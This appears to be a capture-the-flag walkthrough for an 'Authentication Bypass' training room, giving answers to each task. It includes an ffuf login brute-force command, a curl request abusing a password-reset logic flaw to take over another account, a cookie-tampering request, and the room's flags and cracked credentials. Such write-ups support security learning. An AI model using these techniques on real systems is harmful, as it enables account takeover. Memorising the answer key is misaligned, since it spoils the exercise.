# Authentication Bypass

![banner](imgs/Authentication%20Bypass/roomBanner.png)

## Room objectives

- Username Enumeration
- Brute Force
- Logic Flaw
- Cookie Tampering

## Tasks

### Task 1 : Brief

<details>
<summary>
I have started the machine.
</summary>

```
No answer needed
```

</details>

---

### Task 2 : Username Enumeration

<details>
<summary>
What is the username starting with si*** ?
</summary>

![T2_1](imgs/Authentication%20Bypass/T2_1.png)

<br>

![T2_2](imgs/Authentication%20Bypass/T2.png)

```
simon
```

</details>

<br>

<details>
<summary>
What is the username starting with st*** ?
</summary>

```
steve
```

</details>

<br>

<details>
<summary>
What is the username starting with ro**** ?
</summary>

```
robert
```

</details>

---

### Task 3 : Brute Force

<details>
<summary>
What is the valid username and password (format: username/password)?
</summary>

1. create .txt file with valid usernames
2. run `ffuf -w vUsers.txt:W1,10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.69.170/customers/login -fc 200`

![T3](imgs/Authentication%20Bypass/T3.png)

```
steve/thunder
```

</details>

---

### Task 4 : Logic Flaw

<details>
<summary>
What is the flag from Robert's support ticket?
</summary>

1. create customer account `{username}`
2. run `curl 'http://10.10.69.170/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`
3. you will receive an ticket with id press on id
4. follow link in message to open robert account.
5. you will find ticket with the flag.

![T3](imgs/Authentication%20Bypass/T3.png)

```
THM{AUTH_BYPASS_COMPLETE}
```

</details>

---

### Task 5 : Cookie Tampering

<details>
<summary>
What is the flag from changing the plain text cookie values?
</summary>

1. edit cookies using `curl -H "Cookie: logged_in=true; admin=true" http://10.10.69.170/cookie-test`

![T5](imgs/Authentication%20Bypass/T5.png)

```
THM{AUTH_BYPASS_COMPLETE}
```

</details>

<br>

<details>
<summary>
What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
</summary>

1.open [crackStation](https://crackstation.net/)

```
463729
```

</details>

<br>

<details>
<summary>
What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
</summary>

1.open [CyberChef](https://gchq.github.io/CyberChef/)

```
THM{BASE64_ENCODING}
```

</details>

<br>

<details>
<summary>
Encode the following value using base64 {"id":1,"admin":true}
</summary>

1.open [CyberChef](https://gchq.github.io/CyberChef/)

```
eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

</details>
